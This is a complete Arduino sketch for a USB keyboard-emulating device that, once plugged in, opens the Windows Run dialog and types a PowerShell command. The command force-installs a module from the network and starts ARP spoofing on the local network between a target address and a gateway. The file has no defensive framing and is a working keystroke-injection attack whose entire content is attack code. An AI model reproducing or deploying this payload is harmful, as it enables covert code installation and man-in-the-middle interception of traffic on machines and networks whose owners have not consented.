#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("powershell -c \"Install-PackageProvider -Name NuGet -Force; Install-Module -Name PSArpSpoof -Force; Start-ArpSpoof -InterfaceIndex (Get-NetAdapter | Where-Object Status -eq 'Up').ifIndex -TargetIP 192.168.1.1 -GatewayIP 192.168.1.254\""));
}

void loop() {}
